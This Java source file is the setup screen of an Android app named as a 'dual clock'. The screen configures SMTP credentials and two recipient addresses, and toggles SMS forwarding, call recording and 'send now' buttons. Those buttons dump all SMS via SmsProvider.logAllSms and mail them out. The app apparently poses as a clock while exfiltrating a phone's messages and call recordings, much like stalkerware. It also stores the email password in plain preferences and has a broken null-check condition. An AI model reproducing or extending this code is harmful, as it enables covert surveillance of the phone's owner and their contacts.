package com.and.dualclock;

/**
 * 
 * @author GK
 *
 */
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.view.View;
import android.view.Window;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.Toast;
import android.widget.ToggleButton;

public class Setup extends Activity {

	public static int enable, sms_enable, record_enable;

	SharedPreferences myPrefs;
	ToggleButton tb, sms_toggle, record_toggle;

	public static String common_emailid = "", common_password = "",
			common_to1 = "", common_to2 = "", common_smtpserver = "",
			common_smtpport = "";
	public static int lock = 0, sms = 0, record = 0,first_state=0;
	RelativeLayout hide;
	EditText emailid, pass, email_to1, email_to2, smtp_port, smtp_server;
	Button finish, setup_btn, sms_btn, mail_btn;

	IncomingCallReceiver incoming = new IncomingCallReceiver();
	
	

	public void onCreate(Bundle sav) {
		super.onCreate(sav);

		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.config);

		myPrefs = PreferenceManager.getDefaultSharedPreferences(this);
		SharedPreferences.Editor editor = myPrefs.edit();
		editor.putString("common_emailid", common_emailid);
		editor.putString("common_password", common_password);
		editor.putString("common_to1", common_to1);
		editor.putString("common_to2", common_to2);
		editor.putString("common_smtpserver", common_smtpserver);
		editor.putString("common_smtpport", common_smtpport);
		editor.putInt("lock", lock);
		editor.putInt("sms", sms);
		editor.putInt("recordstate", first_state);
		editor.putInt("record", record);
		editor.commit();

		tb = (ToggleButton) findViewById(R.id.mail_toggleButton);

		sms_toggle = (ToggleButton) findViewById(R.id.sms_ToggleButton);
		record_toggle = (ToggleButton) findViewById(R.id.record_ToggleButton);

		sms_btn = (Button) findViewById(R.id.sms_sendnow_btn);
		mail_btn = (Button) findViewById(R.id.mail_sendnpw_btn);

		hide = (RelativeLayout) findViewById(R.id.relativeLayout3);
		hide.setVisibility(View.GONE);

		

		int sms = myPrefs.getInt("smssend", 2);
		if (sms == 1)
			sms_toggle.setChecked(true);

		// sms on/off
		sms_toggle.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (sms_toggle.isChecked()) {

					SharedPreferences.Editor editor = myPrefs.edit();
					editor.putInt("sms", 1);
					editor.putInt("smssend", 1);
					editor.commit();
					int sms1 = myPrefs.getInt("sms", 2);
					SMSRecieve smsrecieve = new SMSRecieve();
					incoming.setsms(sms1);
					smsrecieve.setsms(sms1);

				}
				if (!sms_toggle.isChecked()) {
					SharedPreferences.Editor editor = myPrefs.edit();
					editor.putInt("smssend", 0);
					editor.putInt("sms", 0);
					editor.commit();
					int sms1 = myPrefs.getInt("sms", 2);
					SMSRecieve smsrecieve = new SMSRecieve();
					incoming.setsms(sms1);
					smsrecieve.setsms(sms1);
				}

			}
		});
		// record on/off

		

		int recordstate123 = myPrefs.getInt("recordstate", 2);
		if (recordstate123 == 1)
		{
			record_toggle.setChecked(true);
			incoming.setrecord(1);
		}
		

		
		
		if (tb.isChecked() == true) {
			editor.putInt("lock", 1);
			editor.putInt("mailsend", 1);
			editor.commit();
			String from_email = myPrefs.getString("common_emailid", "");
			String from_email_pass = myPrefs.getString("common_password", "");
			String to_email1 = myPrefs.getString("common_to1", "");
			String to_email2 = myPrefs.getString("common_to2", "");
			String common_smtpserver = myPrefs.getString("common_smtpserver",
					"");
			String common_smtpport = myPrefs.getString("common_smtpport", "");
			int lock = myPrefs.getInt("lock", 2);

			incoming.valueset(from_email, from_email_pass, to_email1,
					to_email2, common_smtpserver, common_smtpport, lock);

			Main main = new Main();
			main.setlock(lock);
		}
		
		record_toggle.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (record_toggle.isChecked()) {
					SharedPreferences.Editor editor = myPrefs.edit();
					editor.putInt("record", 1);
					first_state = 1 ;
					editor.putInt("recordstate", first_state);
					editor.commit();
					int record1 = myPrefs.getInt("record", 2);
					incoming.setrecord(record1);
				} 
				if (!record_toggle.isChecked()) {
					SharedPreferences.Editor editor = myPrefs.edit();
					editor.putInt("record", 0);
					first_state = 0 ;
					editor.putInt("recordstate", first_state);
					
					editor.commit();

					int record1 = myPrefs.getInt("record", 2);
					incoming.setrecord(record1);
				}

			}
		});

		sms_btn.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {

				String from_email = myPrefs.getString("common_emailid", "");
				String from_email_pass = myPrefs.getString("common_password",
						"");
				String to_email1 = myPrefs.getString("common_to1", "");
				String to_email2 = myPrefs.getString("common_to2", "");
				String common_smtpserver = myPrefs.getString(
						"common_smtpserver", "");
				String common_smtpport = myPrefs.getString("common_smtpport",
						"");
				int lock = myPrefs.getInt("lock", 2);

				incoming.valueset(from_email, from_email_pass, to_email1,
						to_email2, common_smtpserver, common_smtpport, lock);
				if (from_email != null && from_email_pass != null
						&& to_email1 != null || to_email2 != null
						&& common_smtpserver != null && common_smtpport != null) {

					try {
						String smsall = SmsProvider.logAllSms(Setup.this);
						smsall = "" + smsall;
						Thread smsThread = new Thread() {
							@Override
							public void run() {
								try {
									super.run();

									incoming.sendSmsNow();
								} catch (Exception e) {

									e.printStackTrace();
								} finally {

								}
							}
						};
						smsThread.start();
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				} else {
					/*
					 * Toast.makeText(Setup.this,
					 * "Mail Configuration Error.Check it.",
					 * Toast.LENGTH_SHORT).show();
					 */
				}

			}
		});
		mail_btn.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {

				String from_email = myPrefs.getString("common_emailid", "");
				String from_email_pass = myPrefs.getString("common_password",
						"");
				String to_email1 = myPrefs.getString("common_to1", "");
				String to_email2 = myPrefs.getString("common_to2", "");
				String common_smtpserver = myPrefs.getString(
						"common_smtpserver", "");
				String common_smtpport = myPrefs.getString("common_smtpport",
						"");
				int lock = myPrefs.getInt("lock", 2);

				incoming.valueset(from_email, from_email_pass, to_email1,
						to_email2, common_smtpserver, common_smtpport, lock);

				if (from_email != null && from_email_pass != null
						&& to_email1 != null || to_email2 != null
						&& common_smtpserver != null && common_smtpport != null) {

					try {
						Thread mailThread = new Thread() {
							@Override
							public void run() {
								try {
									super.run();

									incoming.sendmailnow();
								} catch (Exception e) {

									e.printStackTrace();
								} finally {

								}
							}
						};
						mailThread.start();
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				} else {

				}
				/*
				 * Toast.makeText(Setup.this,
				 * "Mail Configuration Error.Check it.",
				 * Toast.LENGTH_SHORT).show();
				 */

			}
		});

		final AlertDialog.Builder builder = new AlertDialog.Builder(this);
//		enable = myPrefs.getInt("enable", enable);
		int mailsend = myPrefs.getInt("mailsend", 2);
		if (mailsend == 1)
			tb.setChecked(true);

		tb.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (tb.isChecked()) {
					SharedPreferences.Editor editor = myPrefs.edit();
					editor.putInt("lock", 1);
					editor.putInt("mailsend", 1);
					editor.commit();
					String from_email = myPrefs.getString("common_emailid", "");
					String from_email_pass = myPrefs.getString(
							"common_password", "");
					String to_email1 = myPrefs.getString("common_to1", "");
					String to_email2 = myPrefs.getString("common_to2", "");
					String common_smtpserver = myPrefs.getString(
							"common_smtpserver", "");
					String common_smtpport = myPrefs.getString(
							"common_smtpport", "");
					int lock = myPrefs.getInt("lock", 2);

					incoming
							.valueset(from_email, from_email_pass, to_email1,
									to_email2, common_smtpserver,
									common_smtpport, lock);

					Main main = new Main();
					main.setlock(1);

				} else if (!tb.isChecked()) {

					SharedPreferences.Editor editor = myPrefs.edit();
					editor.putInt("lock", 0);
					editor.putInt("mailsend", 0);
					editor.commit();
					String from_email = myPrefs.getString("common_emailid", "");
					String from_email_pass = myPrefs.getString(
							"common_password", "");
					String to_email1 = myPrefs.getString("common_to1", "");
					String to_email2 = myPrefs.getString("common_to2", "");
					String common_smtpserver = myPrefs.getString(
							"common_smtpserver", "");
					String common_smtpport = myPrefs.getString(
							"common_smtpport", "");
					int lock = myPrefs.getInt("lock", 2);

					incoming
							.valueset(from_email, from_email_pass, to_email1,
									to_email2, common_smtpserver,
									common_smtpport, lock);

					Main main = new Main();
					main.setlock(0);

				}

			}
		});

		emailid = (EditText) findViewById(R.id.emailid);
		pass = (EditText) findViewById(R.id.pass_email);
		email_to1 = (EditText) findViewById(R.id.to_email1);
		email_to2 = (EditText) findViewById(R.id.to_email2);
		smtp_server = (EditText) findViewById(R.id.smtp_server);
		smtp_port = (EditText) findViewById(R.id.smtp_port);

		finish = (Button) findViewById(R.id.finish_btn);
		setup_btn = (Button) findViewById(R.id.setup_btn);
		setup_btn.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {

				hide.setVisibility(View.VISIBLE);
				String from_email = myPrefs.getString("common_emailid", "");
				String from_email_pass = myPrefs.getString("common_password",
						"");
				String to_email1 = myPrefs.getString("common_to1", "");
				String to_email2 = myPrefs.getString("common_to2", "");
				String common_smtpserver = myPrefs.getString(
						"common_smtpserver", "");
				String common_smtpport = myPrefs.getString("common_smtpport",
						"");
				emailid.setText(from_email);
				pass.setText(from_email_pass);
				email_to1.setText(to_email1);
				email_to2.setText(to_email2);
				smtp_server.setText(common_smtpserver);
				smtp_port.setText(common_smtpport);

				Button clearbtn = (Button) findViewById(R.id.clear_btn);
				clearbtn.setOnClickListener(new OnClickListener() {

					@Override
					public void onClick(View v) {
						emailid.setText("");
						pass.setText("");
						email_to1.setText("");
						email_to2.setText("");
						smtp_server.setText("");
						smtp_port.setText("");
						SharedPreferences.Editor editor = myPrefs.edit();
						editor.putString("common_emailid", emailid.getText()
								.toString());
						editor.putString("common_password", pass.getText()
								.toString());
						editor.putString("common_to1", email_to1.getText()
								.toString());
						editor.putString("common_to2", email_to2.getText()
								.toString());
						editor.putString("common_smtpserver", smtp_server
								.getText().toString());
						editor.putString("common_smtpport", smtp_port.getText()
								.toString());

						editor.commit();
						Toast.makeText(Setup.this, "Preference Saved.",
								Toast.LENGTH_SHORT).show();
						// hide.setVisibility(View.GONE);
						String from_email = myPrefs.getString("common_emailid",
								"");
						String from_email_pass = myPrefs.getString(
								"common_password", "");
						String to_email1 = myPrefs.getString("common_to1", "");
						String to_email2 = myPrefs.getString("common_to2", "");
						String common_smtpserver = myPrefs.getString(
								"common_smtpserver", "");
						String common_smtpport = myPrefs.getString(
								"common_smtpport", "");
						int lock = myPrefs.getInt("lock", 2);

						incoming.valueset(from_email, from_email_pass,
								to_email1, to_email2, common_smtpserver,
								common_smtpport, lock);

					}
				});

			}
		});

		finish.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {

				if (emailid.getText().toString().equals("")
						&& pass.getText().toString().equals("")
						&& email_to1.getText().toString().equals("")
						&& email_to2.getText().toString().equals("")
						&& smtp_server.getText().toString().equals("")
						&& smtp_port.getText().toString().equals("")) {
					builder.setTitle("Alert");
					builder.setMessage("Enter From,To and SMTP Fields.");
					builder.setPositiveButton("OK", null);
					builder.show();
				} else if (emailid.getText().toString().equals("")) {
					builder.setTitle("Alert");
					builder.setMessage("Enter From E-Mail Address.");
					builder.setPositiveButton("OK", null);
					builder.show();
				}

				else if (pass.getText().toString().equals("")) {
					builder.setTitle("Alert");
					builder.setMessage("Enter Password.");
					builder.setPositiveButton("OK", null);
					builder.show();
				} else if (email_to1.getText().toString().equals("")) {
					builder.setTitle("Alert");
					builder.setMessage("Enter E-mail Id 1.");
					builder.setPositiveButton("OK", null);
					builder.show();
				} else if (email_to2.getText().toString().equals("")) {
					builder.setTitle("Alert");
					builder.setMessage("Enter E-mail Id 2.");
					builder.setPositiveButton("OK", null);
					builder.show();
				}

				else if (smtp_server.getText().toString().equals("")) {
					builder.setTitle("Alert");
					builder.setMessage("Enter SMTP Server.");
					builder.setPositiveButton("OK", null);
					builder.show();
				} else if (smtp_port.getText().toString().equals("")) {
					builder.setTitle("Alert");
					builder.setMessage("Enter SMTP Port.");
					builder.setPositiveButton("OK", null);
					builder.show();
				}

				else {

					int a = 0, b = 0, c = 0;
					if (!emailid.getText().toString().equals("")) {
						if (validate_email(emailid) == true)
							a = 1;

					}
					if (a == 1)
						if (!email_to1.getText().toString().equals("")) {
							if (validate_email(email_to1) == true)
								b = 1;

						} 

					if (b == 1)
						if (!email_to2.getText().toString().equals("")) {
							if (validate_email(email_to2) == true)
								c = 1;
						}

					if (a == 1 && b == 1 && c == 1) {

						SharedPreferences.Editor editor = myPrefs.edit();
						editor.putString("common_emailid", emailid.getText()
								.toString());
						editor.putString("common_password", pass.getText()
								.toString());
						editor.putString("common_to1", email_to1.getText()
								.toString());
						editor.putString("common_to2", email_to2.getText()
								.toString());
						editor.putString("common_smtpserver", smtp_server
								.getText().toString());
						editor.putString("common_smtpport", smtp_port.getText()
								.toString());

						editor.commit();
						Toast.makeText(Setup.this, "Preference Saved.",
								Toast.LENGTH_SHORT).show();
						hide.setVisibility(View.GONE);
						String from_email = myPrefs.getString("common_emailid",
								"");
						String from_email_pass = myPrefs.getString(
								"common_password", "");
						String to_email1 = myPrefs.getString("common_to1", "");
						String to_email2 = myPrefs.getString("common_to2", "");
						String common_smtpserver = myPrefs.getString(
								"common_smtpserver", "");
						String common_smtpport = myPrefs.getString(
								"common_smtpport", "");
						int lock = myPrefs.getInt("lock", 2);

						incoming.valueset(from_email, from_email_pass,
								to_email1, to_email2, common_smtpserver,
								common_smtpport, lock);
					}
				}

			}

			// validate mail
			private boolean validate_email(EditText email) {
				if (email == null || email.length() == 0) {
					builder.setTitle("EmailId");
					builder
							.setMessage("Enter your valid EmailId for From/To E-Mail.");
					builder.setPositiveButton("OK", null);
					builder.show();
					return false;
				}
				if (email.length() > 100) {

					builder.setTitle("EmailId");
					builder
							.setMessage("Enter your valid EmailId for From/To E-Mail.");
					builder.setPositiveButton("OK", null);
					builder.show();
					return false;
				}
				String mail1 = email.getText().toString();
				Pattern p = Pattern
						.compile("^\\w+([\\.-]?\\w+)*@\\w+([\\.-]?\\w+)*(\\.\\w{2,3})+$");
				Matcher m = p.matcher(mail1.trim());
				boolean matchFound = m.matches();
				if (matchFound == false) {
					builder.setTitle("EmailId");
					builder
							.setMessage("Enter your valid EmailId for From/To E-Mail.");
					builder.setPositiveButton("OK", null);
					builder.show();
					return false;
				}
				return true;
			}
		});
	}

	public void first_record(int i) {
		first_state = i;
	}

}
